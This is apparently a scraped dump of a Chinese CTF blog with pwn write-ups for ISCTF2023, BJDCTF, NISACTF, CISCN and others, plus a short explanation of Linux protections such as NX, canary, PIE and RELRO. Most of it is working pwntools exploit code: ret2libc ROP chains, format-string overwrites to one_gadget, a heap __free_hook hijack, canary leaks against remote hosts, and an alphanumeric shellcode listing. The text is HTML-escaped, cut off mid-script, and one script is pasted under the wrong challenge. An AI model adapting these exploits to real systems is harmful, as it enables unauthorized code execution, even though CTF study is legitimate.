=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()p = remote(&#x27;43.249.195.138&#x27;,20012)#libc =ELF(&#x27;libc-2.31.so&#x27;)#p = process(&quot;./ezpie&quot;)#debug()p.send(b&#x27;b&#x27;*(40-3) + b&#x27;v5:&#x27;)# pause()p.recvuntil(b&#x27;v5:&#x27;)v5 = u64(p.recvuntil(b&#x27;\\x0a&#x27;, drop=True) + b&#x27;\\0\\0&#x27;)success(&#x27;v5: &#x27;+ hex(v5))code_base = v5 - elf.sym[&#x27;func&#x27;]success(&quot;code_base: %s&quot;,hex(code_base) )pop_rdi_ret =code_base + 0x0000000000001333pop_rsi_r15_ret =code_base + 0x0000000000001331ret_addr =code_base + 0x000000000000101aleave_ret =code_base + 0x0000000000001252  # : leave; ret; str_bin_sh =code_base + 0x0000000000002008pop_rax_ret =code_base + 0x00000000000012c8puts_got = code_base + elf.got[&#x27;puts&#x27;]puts_plt = code_base + elf.plt[&#x27;puts&#x27;]main_addr = code_base + elf.sym[&#x27;main&#x27;]syscall = code_base + 0x00000000000012c5pop_all = code_base+ 0x000000000000132cogg = code_base+0xe3afeogg2 = code_base +0xe3b01ogg3 = code_base+0xe3b04payload2  = b&#x27;a&#x27; * 0x50 + b&#x27;b&#x27; * 8  +p64(pop_rdi_ret)+p64(puts_got) + p64(puts_plt)+ p64(main_addr)p.recvuntil(b&quot;please enter your information-&gt;&quot;)p.sendline(payload2)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&#x27;puts: %s&#x27;,puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)#9 - libc6_2.31-0ubuntu9.9_amd64libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)one_gadget = libc_base + 0xe3afe#尝试过其他几个，貌似只有这个能打p.send(&#x27;fxxkingpie&#x27;)payload3  = b&#x27;a&#x27; * (0x50 + 0x8)payload3 += p64(ret_addr)payload3 += p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)#payload3 += p64(pop_all) + p64(one_gadget)p.sendline(payload3)p.interactive()\n\n[ISCTF2023 stack]checksec直接看vuln函数  一开始以为是类似于off-by-one的漏洞，一直陷入了误区实际上就是单纯的溢出，但是我们像平时一样测试溢出时，会导致数组s[i]的下标i被覆盖，比如我们使用这样的exp测试\nfrom pwn import *elf = ELF(&#x27;./stack&#x27;)p = process(&#x27;./stack&#x27;)context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()ret = 0x000000000040101apop_rbp_ret = 0x00000000004011bdleave_ret = 0x00000000004012e4size = b&#x27;1000&#x27;p.recvuntil(b&quot;size: &quot;)p.sendline(size)pay = cyclic(80)p.send(pay)debug()p.interactive()\n会导致数组写入时出现其原因为数组下标i被b’a’覆盖，实际上数据就被读入到了s[61]处，导致我们无法覆盖返回地址这里我们找准i的偏移，并在合适的时候填写正确的数组下标，防止其被覆盖，我们就能正常溢出覆盖返回地址\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()elf = ELF(&#x27;./stack&#x27;)#p = process(&#x27;./stack&#x27;)p = remote(&#x27;43.249.195.138&#x27;, 22555)ret = 0x000000000040101ap.sendline(b&#x27;10000&#x27;)payload = b&#x27;a&#x27;*28payload += b&#x27;\\x1d&#x27;payload += b&#x27;\\x00&#x27;*2payload += p64(ret)payload += p64(ret)payload += p64(elf.sym[&#x27;backdoor&#x27;])p.send(payload)p.interactive()\n[ISCTF2023 fmt]纯纯的纸老虎checksec保护全开，别被吓到，抓住关键点把v1,v2改了就能拿到shell，根本不用溢出 &#x3D; NX和canary没用，根本不用改got表 &#x3D; full-relro没用，开了pie &#x3D; 偏移一定格式化字符串直接改就行\nfrom pwn import *elf = ELF(&#x27;./fmt&#x27;)p = process(&#x27;./fmt&#x27;)context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()main = b&#x27;%26$p&#x27;canary =b&#x27;%27$p&#x27;offset = 10debug()pay = &#x27;aaaaaaaaaaaaaaaaaa%8$nbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb%9$n&#x27;p.send(pay)p.interactive()&#x27;&#x27;&#x27;#!/usr/bin/python3# 格式化符号说明%x 以十六进制打印，只能打印4字节，一般只用于32位%p 打印目标地址，建议32位和64位都用这个%s 打印地址内容%c 打印单个字符%hhn 写一字节%hn  写两字节%n   写四字节%ln  32位写四字节，64位写八字节%lln 写八字节&#x27;&#x27;&#x27;\n[ISCTF2023 fries]checksec主要漏洞点在format函数，给了7次啊7次格式化字符串漏洞利用机会第一次泄露elfbase，第二次泄露puts地址和libc_base,第三次把ret地址改成one_gadget\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)p = process(&#x27;./fries&#x27;)#p = remote(&#x27;43.249.195.138&#x27;,21702)libc = ELF(&#x27;libc.so.6&#x27;)def debug():    gdb.attach(p)    pause()p.recvuntil(&#x27;Emmmmm... Could you give me some fries\\n&#x27;)p.sendline(&#x27;fries\\x00&#x27;)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(b&#x27;%10$p%24$p&#x27;)x= int(p.recv(14),16)elf_base = x-16416elf.address = elf_basestack= int(p.recv(14),16)ret = stack - 72pay = b&#x27;%9$s&#x27;pay += (8 - (len(pay) % 8)) * b&#x27;A&#x27;pay += p64(elf.got[&#x27;puts&#x27;])p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(pay)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&#x27;puts: %s&#x27;,puts_addr)libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]ogg = [0x50a47,0xebc81,0xebc85,0xebc88,0xebce2,0xebd3f,0xebd43]og = libc_base + ogg[0]o1 = og &amp;0xFFFFFFFFo2 = (og &gt;&gt; 32)&amp;0xFFFFFFFFsuccess(&#x27;libc_base: %s&#x27;,libc_base)pay = fmtstr_payload(8,&#123;ret:o1&#125;,write_size=&#x27;short&#x27;)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(pay)pay = fmtstr_payload(8,&#123;ret+4:o2&#125;,write_size=&#x27;short&#x27;)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(pay)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(&#x27;\\x00\\x00\\x00\\x00&#x27;)for i in range(4):    p.sendline(&#x27;ls\\x00&#x27;)p.interactive()\n[ISCTF2023 touch_file1]?\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)p=remote(&#x27;43.249.195.138&#x27;,21284)p.sendline(b&#x27;test\\ncat flag\\n&#x27;)p.interactive()\n[ISCTF2023 touch_file2]一道glibc2.31的删符号表的cpp堆题太抽象了:(存个exp就跑\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)p = process(&#x27;./touch_file2&#x27;)#p = remote(&#x27;43.249.195.138&#x27;,22475)def add(name):    p.recvuntil(&#x27;&gt;&#x27;)    p.send(&#x27;touch &#x27;)    p.sendline(name)def edit(name,text):    p.recvuntil(&#x27;&gt;&#x27;)    p.send(&#x27;edit &#x27;)    p.send(name)    p.send(&#x27; &#x27;)    p.sendline(text)def rm(name):    p.recvuntil(&#x27;&gt;&#x27;)    p.send(&#x27;rm &#x27;)    p.sendline(name)for i in range(8):    add(str(i))#rm(&#x27;1&#x27;)p.recvuntil(&#x27;&gt;&#x27;)p.sendline(&#x27;cp 0 8\\n&#x27;)p.sendline(&#x27;cp 1 9\\n&#x27;)for i in range(8-1,-1,-1):    rm(str(i))p.recvuntil(&#x27;&gt;&#x27;)p.sendline(&#x27;cat 8&#x27;)p.recvuntil(&#x27;file_content is &#x27;)x = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_base = x -3390432 + 1372160libc = elf.libc__free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]edit(&#x27;9&#x27;,p64(__free_hook))success(&#x27;libc_base:%s&#x27;,hex(libc_base))add(&#x27;yy /bin/sh\\x00&#x27;)add(b&#x27;tt &#x27;+p64(system))rm(&#x27;yy&#x27;)p.interactive()","categories":["wp"],"tags":["wp"]},{"title":"山石安研院2023CTF夏令营_pwn","url":"/2023/08/19/HSNCTF-2023-summer/","content":"两道题都用ret2libc了，最后一道heap0解ret2syscall\nfrom pwn import*from LibcSearcher import *elf=ELF(&#x27;./pwn&#x27;)p = remote(&#x27;58.240.236.231&#x27;,49003)pop_rdi_ret = 0x40072bret_addr = 0x400509main_addr = 0x4006c7syscall = 0x400741puts_plt = 0x400520puts_got = 0x601018payload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))log.info(&quot;puts addr is :%x&quot;%puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8 + p64(ret_addr)+ p64(pop_rdi_ret) + p64(0x601048) + p64(system_addr)p.sendline(payload)p.interactive()\n\nret2libc\nfrom pwn import*import sgtlibcelf=ELF(&#x27;./pwn&#x27;)p = remote(&#x27;58.240.236.231&#x27;,49002)libc =ELF(&#x27;libc-2.23.so&#x27;)pop_rdi_ret = 0x400783ret_addr = 0x400509main_addr = 0x4006FDputs_plt = 0x400520puts_got = 0x601018bss = 0x601060payload1 = b&#x27;a&#x27;*208+b&#x27;b&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload1)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=3) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrpayload2 = b&#x27;a&#x27;*208+b&#x27;b&#x27;*8 + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)p.sendlineafter(&quot;name:&quot;,payload2)p.interactive()#LibcSearcher 扫出来的死都不对，气煞我也！\n","categories":["wp"],"tags":["ret2libc"]},{"title":"Linux保护机制","url":"/2023/07/25/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","content":"矛与盾NX数据不可执行。原理是将数据所在内存页标识为不可执行，防止因为程序运行出现溢出而使得攻击者的shellcode可能会在数据区尝试执行的情况。NX在咱屡战屡败的经典栈溢出实验中有接触过，NX是对栈和堆的一种保护机制。实验需要关闭NX和地址随机化，否则执行shellcode时，CPU就会抛出异常，而不是去执行恶意指令。Linux系统叫做NX，Windows系统中类似的机制叫DEP(Data Execute Prevention)。绕过方式：ret2libc 例题：[BJDCTF 2020]babyrop本题没给libc，如果给了libc可以采用elf&#x3D;ELF[‘libc.so’]直接读地址\nfrom pwn import*import sgtlibcelf=ELF(&#x27;/home/str1k3/桌面/babyrop&#x27;)#elf=ELF(&#x27;./libc.so&#x27;)p = remote(&#x27;1.14.71.254&#x27;,28013)pop_rdi_addr = 0x400733ret_addr = 0x4004c9main_addr = 0x4006ADputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendlineafter(&#x27;story!\\n&#x27;,payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))log.info(&quot;puts addr is :%x&quot;%puts_addr)s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=6) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrpayload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8 + p64(ret_addr) +p64(pop_rdi_addr)+p64(bin_sh)+p64(system)p.sendlineafter(&#x27;story!\\n&#x27;,payload)p.interactive()\n\n\n也可以用LibcSearcher，找出来的libc版本不一定对，多试几次贴个LibcSearcher的板子\nfrom pwn import *from LibcSearcher import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) io = process(&#x27;./ezrop64&#x27;)#io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28173)elf=ELF(&#x27;./ezrop64&#x27;)padding = 0x100+0x08pop_rdi_ret = 0x4012a3ret_addr =0x40101adef rl(a):    io.recvuntil(a)rl(b&#x27;0x&#x27;)puts_addr = int(io.recv(12), 16)print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)print(&#x27;puts_addr:&#x27;,hex(puts_addr))print(&#x27;libc_base:&#x27;,hex(libc_base))print(&#x27;system_addr:&#x27;,hex(system_addr))print(&#x27;bin_addr:&#x27;,hex(bin_addr))#gdb.attach(io)payload2 = b&#x27;a&#x27;* padding + p64(ret_addr)+ p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)io.sendline(payload2)io.interactive()\n\n\nStack Canary栈保护。栈溢出保护是一种缓冲区溢出攻击缓解手段。启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。简单来说就是通过验证cookie，来判断执行的代码是不是恶意代码。cannary通常可分为3类：1.Terminator canaries:由于字符串操作不当可造成栈溢出，而字符串可以被Null(“\\x00”)所截断，于是Terminator canaries将低位设置为”\\x00“,可以防止被泄露，也可以防止被伪造。截断字符还可包括CR(0x0d)、LF（0x0a）、EOF(0xff)。2.Randon canaries:为防止canary被攻击者猜到，Randon canaries通常在程序初始化时生成，并保存在相对安全的地方。随机数通常由&#x2F;dev&#x2F;urandom生成，有时也会使用当前时间的哈希。3.Randon XOR canaries:与Randon canaries类似，但多了一个XOR操作，这样无论是canary被篡改还是与之XOR的控制数据被篡改，都会发生错误。**例：[BJDCTF 2020]babyrop2 **查查保护gift给了格式化字符串漏洞，可以泄露canary尝试泄露canarycanary的值位于rbp-0x08处，即rbp-0x08 &#x3D; 0x20 - 0x08 &#x3D; 0x18在这里溢出exp\nfrom pwn import *from LibcSearcher import *io = remote(&quot;node4.anna.nssctf.cn&quot;,28668)elf = ELF(&quot;./bjdctf_2020_babyrop2&quot;)main_addr = elf.symbols[&#x27;main&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]vuln_addr = 0x400887#ROPgadgetrdi = 0x0000000000400993 #: pop rdi ; retio.sendline(&#x27;%7$p&#x27;)io.recvuntil(&quot;0x&quot;)canary = int(io.recv(16),16)#print hex(canary)#泄露puts函数地址payload = (0x20-0x08)*&#x27;a&#x27;+p64(canary)+&#x27;a&#x27;*8+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)io.sendlineafter(&quot;story!\\n&quot;,payload)puts_addr = u64(io.recv(6).ljust(8,&quot;\\x00&quot;))#ret2libclibc = LibcSearcher(&quot;puts&quot;,puts_addr)libc_base = puts_addr - libc.dump(&quot;puts&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)bin_sh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = (0x20-0x08)*&#x27;a&#x27;+p64(canary)+&#x27;a&#x27;*8+p64(rdi)+p64(bin_sh_addr)+p64(sys_addr)io.sendlineafter(&quot;story!\\n&quot;,payload)io.interactive()\n\n\nPIE &#x2F; ASLR 地址随机化。就是保证同一个程序任意两次运行时的堆栈基址是不同的。如果堆栈基址不变会怎样？不变就可能被攻击，因为攻击者能确认程序的内存地址，然后通过覆盖返回地址在等手段执行恶意代码。咱屡战屡败的经典栈溢出实验就是通过覆盖返回地址执行恶意代码。点击图片可查看完整电子表格pie的特点：pie保护下，地址后三位不变，相对地址不变，可以利用该特点来绕过pie。例：[NISACTF 2022]ezpie存在溢出得到相对地址，即shell_addr &#x3D; main_addr + 0x80F - 0x770exp\nfrom pwn import *context.log_level = &#x27;debug&#x27;# p = process(&quot;./ezpie&quot;)io = remote(&#x27;1.14.71.254&#x27;, 28335)io.recvuntil(&#x27;0x&#x27;)main_addr = int(p.recv(8), 16)print(&#x27;[+]main_addr: &#x27;, hex(main_addr))shell_addr = main_addr + 0x80F - 0x770print(&#x27;[+]shell_addr: &#x27;, hex(shell_addr))payload = b&#x27;a&#x27;*(0x28 + 4) + p32(shell_addr)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload)io.interactive()\n\nRelro只读重定位。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT攻击。在Linux中有”Partial RELRO” “Full RELRO”两种模式，默认开启Partical RELRO，开启Partical RELRO时，GOT是可写的，开启 FULL RELRO 时，GOT表是只读的。 主要用来保护重定位表段对应数据区域，默认可写 Partial RELRO： got表不可写，got.plt可写 Full RELRO： got表，got.plt不可写  部分RELRO 易受到攻击，例如攻击者可以修改atoi.got为system.plt，进而输入&#x2F;bin&#x2F;sh\\x00获得shell完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。参考：https://www.zhihu.com/question/21249496FORTIFY在编译的时候检查源码是否存在缓冲区溢出等错误。简单地说，加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk, __printf_chk等。这些带了chk的函数会检查读取&#x2F;复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。##BRATH程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击。源码分享，来自《CTF竞赛权威指南——pwn篇》链接：https://pan.baidu.com/s/1r2v-73lAK-PlUQpAnPV4iw 提取码：1145 \n","categories":["basic"],"tags":["Linux"]},{"title":"MyS3andB0x","url":"/2024/03/15/MyS3andB0x/","content":"刷题合集从开始的开始来的，就当是电子考古了）但是持续更新\nP | [BJDCTF 2020]babystack | 解题做题人题目说明整数溢出\n解题思路from pwn import *#引用pwntools库io = remote(&quot;1.14.71.254&quot;,28792)#开启链接io.recvuntil(&quot;your name:\\n&quot;)io.sendline(b&#x27;-1&#x27;)backdoor = 0x400726payload = b&#x27;a&#x27; * 0x18 + p64(backdoor)io.sendline(payload)io.interactive()\n\nP | [BJDCTF 2020]babystack2 | 解题做题人题目说明ez64 位溢出\n解题思路from pwn import *p = connect(&quot;1.14.71.254&quot;,28622)p.sendlineafter(&quot;length of your name:\\n&quot;,&quot;-1&quot;)payload = 24*&#x27;a&#x27;+ p64(0x0000000000400893) + p64(0) + p64(0x0000000000400726)p.sendlineafter(&quot;name?\\n&quot;,payload)p.interactive()\n\nP |[NISACTF 2022]ezstack | 解题做题人题目说明ez32 位栈溢出\n解题思路from pwn import *p = connect(&quot;1.14.71.254&quot;,28622)p.sendlineafter(&quot;length of your name:\\n&quot;,&quot;-1&quot;)payload = 24*&#x27;a&#x27;+ p64(0x0000000000400893) + p64(0) + p64(0x0000000000400726)p.sendlineafter(&quot;name?\\n&quot;,payload)p.interactive()\n\nP | [WUSTCTF 2020]getshell | 解题做题人题目说明32 位栈溢出\n解题思路from pwn import *elf = ELF(&#x27;./service&#x27;)p=process(&#x27;./service&#x27;)#p=remote(&#x27;43.143.7.97&#x27;,28860)shell_addr =0x804851Bpadding = 28payload1 = b&#x27;a&#x27; * padding + p32(shell_addr)p.sendline(payload1)p.interactive()\n\nP |[NISACTF 2022]ezpie | 解题做题人题目说明pie 保护绕过方法，详见保护机制\n解题思路from pwn import *context.log_level = &#x27;debug&#x27;# p = process(&quot;./ezpie&quot;)p = remote(&#x27;1.14.71.254&#x27;, 28335)p.recvuntil(&#x27;0x&#x27;)main_addr = int(p.recv(8), 16)print(&#x27;[+]main_addr: &#x27;, hex(main_addr))shell_addr = main_addr + 0x80F - 0x770print(&#x27;[+]shell_addr: &#x27;, hex(shell_addr))payload = b&#x27;a&#x27;*(0x28 + 4) + p32(shell_addr)p.recvuntil(&quot;Input:\\n&quot;)p.sendline(payload)p.interactive()\n\nP | [NISACTF 2022]ezstack | 解题做题人题目说明栈溢出但是 NX\n解题步骤32 位文件  开启了 NX 保护，堆栈不可执行\n\nIDA 看一手\n\n只有一个 shell() 函数 追一手\n\n72&#x3D;0x48,接收 0x60 个字符输入，存在栈溢出\n\n查看字符串 在 data 段发现 &#39;/bin/sh&#39;\nfrom pwn import *elf = ELF(&quot;./pwn&quot;)p = remote(&quot;1.14.71.254&quot;, 28115)system = elf.plt[&quot;system&quot;]g = b&#x27;a&#x27; * (0x48+4) + p32(system) + p32(0xabcdabcd) + p32(0x0804A024)p.sendlineafter(&quot;Welcome to NISACTF\\n&quot;, g)p.interactive()\n\nP | [CISCN 2022 初赛]login_normal | 解题做题人题目说明解题思路看 main 函数，read 后执行 sub_FFD\n\n跟进 sub_FFD\nunsigned __int64 __fastcall sub_FFD(_BYTE *a1)&#123;  char *sa; // [rsp+8h] [rbp-48h]  char *sb; // [rsp+8h] [rbp-48h]  char *sc; // [rsp+8h] [rbp-48h]  char *sd; // [rsp+8h] [rbp-48h]  char v7; // [rsp+17h] [rbp-39h]  int v8; // [rsp+1Ch] [rbp-34h]  int v9; // [rsp+2Ch] [rbp-24h]  void *dest; // [rsp+30h] [rbp-20h]  char *s1; // [rsp+38h] [rbp-18h]  char *nptr; // [rsp+40h] [rbp-10h]  unsigned __int64 v13; // [rsp+48h] [rbp-8h]  v13 = __readfsqword(0x28u);  memset(qword_202040, 0, sizeof(qword_202040));  v8 = 0;  v7 = 0;  dest = 0LL;  while ( !*a1 || *a1 != 10 &amp;&amp; (*a1 != 13 || a1[1] != 10) )// 关于a[0]和a[1]的判定关系  &#123;    if ( v8 &lt;= 5 )      qword_202040[2 * v8] = a1;                // 处理的位分别是0，8，16，24，32    sb = strchr(a1, 58);                        // 找到字符&#x27;:&#x27;位置    if ( !sb )    &#123;      puts(&quot;error.&quot;);      exit(1);    &#125;    *sb = 0;                                    // 将找到&#x27;:&#x27;的位置数值变为0    for ( sc = sb + 1; *sc &amp;&amp; (*sc == &#x27; &#x27; || *sc == &#x27;\\r&#x27; || *sc == &#x27;\\n&#x27; || *sc == &#x27;\\t&#x27;); ++sc )// sc=sb的下一位，sc满足在范围内且等于指定字符      *sc = 0;                                  // 当前字符置0    if ( !*sc )                 &#123;      puts(&quot;abort.&quot;);      exit(2);    &#125;    if ( v8 &lt;= 5 )      qword_202040[2 * v8 + 1] = sc;            // (0,8,16,24,32)+1出来的值    sd = strchr(sc, &#x27;\\n&#x27;);                    if ( !sd )    &#123;      puts(&quot;error.&quot;);      exit(3);    &#125;    *sd = 0;                                    // 置零    a1 = sd + 1;                                // 首位置到sd的下一位    if ( *a1 == &#x27;\\r&#x27; )                          // 如果当前位是\\r下一位置0      *a1++ = 0;    s1 = (char *)qword_202040[2 * v8];          // 0,8,16,24,32    nptr = (char *)qword_202040[2 * v8 + 1];      if ( !strcasecmp(s1, &quot;opt&quot;) )             &#123;      if ( v7 )      &#123;                                         // 第一次opt退出        puts(&quot;error.&quot;);        exit(5);      &#125;      v7 = atoi(nptr);    &#125;    else    &#123;      if ( strcasecmp(s1, &quot;msg&quot;) )              // 是否是msg      &#123;        puts(&quot;error.&quot;);        exit(4);      &#125;      if ( strlen(nptr) &lt;= 1 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      v9 = strlen(nptr) - 1;                   if ( dest )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      dest = calloc(v9 + 8, 1uLL);      if ( v9 &lt;= 0 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      memcpy(dest, nptr, v9);                     &#125;    ++v8;  &#125;  *a1 = 0;  sa = a1 + 1;                                if ( *sa == &#x27;\\n&#x27; )                            // 如果是换行符就赋值0    *sa = 0;  switch ( v7 )                             &#123;    case 2:      sub_DA8((const char *)dest);      break;    case 3:      sub_EFE((const char *)dest);      break;    case 1:      sub_CBD((const char *)dest);      break;    default:      puts(&quot;error.&quot;);      exit(6);  &#125;  return __readfsqword(0x28u) ^ v13;&#125;\n\n由上述可知，要进行两次校验，在连接之后就需要先写通过校验才可以进行后续操作，即 &#39;opt:1\\r\\nmsg:ro0t\\r\\n 和 opt:2\\r\\nmsg:，且最终结尾必须是 \\r\\n\n绕过后到达 sub_DA8\nunsigned __int64 __fastcall sub_DA8(const char *a1)&#123;  unsigned int v1; // eax  size_t v2; // rax  int i; // [rsp+14h] [rbp-2Ch]  void *dest; // [rsp+18h] [rbp-28h]  unsigned __int64 v6; // [rsp+28h] [rbp-18h]  v6 = __readfsqword(0x28u);  for ( i = 0; i &lt; strlen(a1); ++i )  &#123;    if ( !isprint(a1[i]) &amp;&amp; a1[i] != 10 )    &#123;      puts(&quot;oh!&quot;);      exit(-1);    &#125;  &#125;  if ( unk_202028 != 1 )  &#123;    puts(&quot;oh!&quot;);    exit(-1);  &#125;  if ( unk_202024 )  &#123;    v1 = getpagesize();    dest = (void *)(int)mmap((char *)&amp;loc_FFE + 2, v1, 7, 34, 0, 0LL);    v2 = strlen(a1);    memcpy(dest, a1, v2);    ((void (*)(void))dest)();    //shellcode利用转换执行  &#125;  else  &#123;    puts(a1);  &#125;  return __readfsqword(0x28u) ^ v6;&#125;\n\npush edxpush 0x36363630push esppop ecxxor dword ptr ds:[ecx],esixor esi,dword ptr ds:[ecx]pop eaxpush 0x33333333xor dword ptr ds:[ecx],esiimul esi,dword ptr ds:[ecx],0x33pop eaxpush 0x69push esixor dword ptr ds:[ecx],esidec eaxarpl word ptr ds:[ecx],sipop edxpop eaxpop ecxxor word ptr ds:[ecx+esi*2+0x49],dxdec eaxcmp word ptr ds:[ebx+0x44],bpjno short tested.004780A6xor byte ptr ds:[edx],dhinc espjno short tested.004780ACxor byte ptr ds:[ecx+esi+0x48],aljnz short tested.0047808Ddec ebpxor al,byte ptr ds:[edi+0x30]pop edxxor ch,byte ptr ds:[edi+0x34]dec eaxxor byte ptr ss:[ebp+0x30],dhpush eaxxor dword ptr ds:[esi],esixor byte ptr ds:[edx+0x30],blaaadec edixor byte ptr ds:[edx+0x30],blinc ebxxor dword ptr ds:[eax],esixor byte ptr ds:[ecx+0x35],bhdec edixor eax,dword ptr ds:[edi+0x30]xor dh,byte ptr ds:[eax]inc edxxor ch,byte ptr ds:[esi+0x30]xor byte ptr ss:[esi+0x34],cljno short tested.004780B8outs dx,byte ptr es:[edi]xor dh,byte ptr ds:[eax+esi+0x42]xor byte ptr ds:[eax],dhxor byte ptr ds:[ecx],dhxor byte ptr ds:[ecx],dhxor byte ptr ds:[eax+0x33],clpush ebxxor bh,byte ptr ds:[ecx+0x30]pop ecxxor byte ptr ds:[edi+0x30],clouts dx,byte ptr es:[edi]xor byte ptr ds:[edx+0x30],bhxor dword ptr ds:[ebx],esixor al,0x30xor al,byte ptr fs:[esi+0x34]jns short tested.004780E4push eaxxor dword ptr ds:[ecx],esixor eax,0x306E316Cdec edxxor byte ptr ds:[eax+0x30],chpopadxor byte ptr ds:[edi],dhxor byte ptr ds:[eax+eax],dhadd bh,bhadd byte ptr ds:[eax],aladd bh,bhpop eaxinc ecx\n\nshellcode:&#x2F;bin&#x2F;sh\n#!/usr/bin/env python#coding=utf-8from pwn import*ip = &quot;&quot;port = io = remote(ip,port)libc = ELF(&#x27;./libc-2.23.so&#x27;)io.recvuntil(&quot;&gt;&gt;&gt;&quot;)io.sendline(&#x27;opt:1\\r\\nmsg:ro0t\\r\\n&#x27;)    ##绕过1shellcode = 